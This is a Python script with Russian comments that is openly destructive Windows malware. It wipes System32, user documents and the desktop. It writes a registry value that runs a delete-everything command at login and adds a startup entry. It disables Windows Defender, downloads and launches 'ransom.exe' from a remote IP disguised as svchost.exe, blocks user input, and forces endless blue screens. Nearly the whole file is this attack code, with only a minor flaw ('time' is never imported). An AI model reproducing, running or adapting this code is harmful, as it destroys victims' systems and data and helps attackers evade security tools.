import os
import sys
import ctypes
import shutil
import threading
import winreg
import urllib.request

# КОНФИГ АДА
VICTIM_NAME = os.getlogin()  # ИМЯ ЖЕРТВЫ
DESTROY_PATHS = [
    "C:\\Windows\\System32",
    "C:\\Windows\\SysWOW64",
    "C:\\$Recycle.Bin",
    os.path.expanduser("~\\Documents"),
    os.path.expanduser("~\\Desktop")
]
REG_POISON = [
    ("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Shell", "explorer.exe, cmd.exe /c del /f /q /s C:\\"),
    ("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "RageMode", sys.argv[0])
]
DOWNLOAD_MALWARE = "http://94.158.245.106/static/ransom.exe"  # РЕАЛЬНЫЙ ВРЕДОСОС

# УДАЛЯЕМ ВСЁ К ЧЕРТЯМ
def nuke_files():
    for path in DESTROY_PATHS:
        try:
            if os.path.exists(path):
                shutil.rmtree(path, ignore_errors=True)
                print(f"[☠] УНИЧТОЖЕНО: {path}")
        except:
            pass

# ЛОМАЕМ РЕЕСТР
def kill_registry():
    for reg_path, key, value in REG_POISON:
        try:
            hive, subkey = reg_path.split("\\", 1)
            winreg.CreateKey(getattr(winreg, hive), subkey)
            with winreg.OpenKey(getattr(winreg, hive), subkey, 0, winreg.KEY_WRITE) as key_handle:
                winreg.SetValueEx(key_handle, key, 0, winreg.REG_SZ, value)
        except:
            pass

# КАЧАЕМ ДОПОЛНИТЕЛЬНУЮ ЗАРАЗУ
def download_extra():
    try:
        urllib.request.urlretrieve(DOWNLOAD_MALWARE, os.path.join(os.environ['TEMP'], "svchost.exe"))
        os.system(f"start {os.path.join(os.environ['TEMP'], 'svchost.exe')}")
    except:
        pass

# ГЕНЕРАТОР СИНИХ ЭКРАНОВ
def bsod_attack():
    while True:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))

# ЗАПУСК АДА
if __name__ == "__main__":
    # ДИЗАБИМ ЗАЩИТУ
    os.system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f")
    os.system("net stop WinDefend /y")
    
    # ЗАПУСКАЕМ ПОТОКИ СМЕРТИ
    threading.Thread(target=nuke_files, daemon=True).start()
    threading.Thread(target=kill_registry, daemon=True).start()
    threading.Thread(target=download_extra, daemon=True).start()
    
    # БЛОКИРУЕМ СИСТЕМУ
    ctypes.windll.user32.BlockInput(True)
    
    # ФИНАЛЬНЫЙ УДАР
    print(f"[⚡] {VICTIM_NAME}, ТВОЯ ВИНДА УМРЁТ ЧЕРЕЗ 5 СЕКУНД!")
    for i in range(5, 0, -1):
        print(f"[{i}]")
        time.sleep(1)
    
    # СИНИЙ ЭКРАН НАВСЕГДА
    bsod_attack()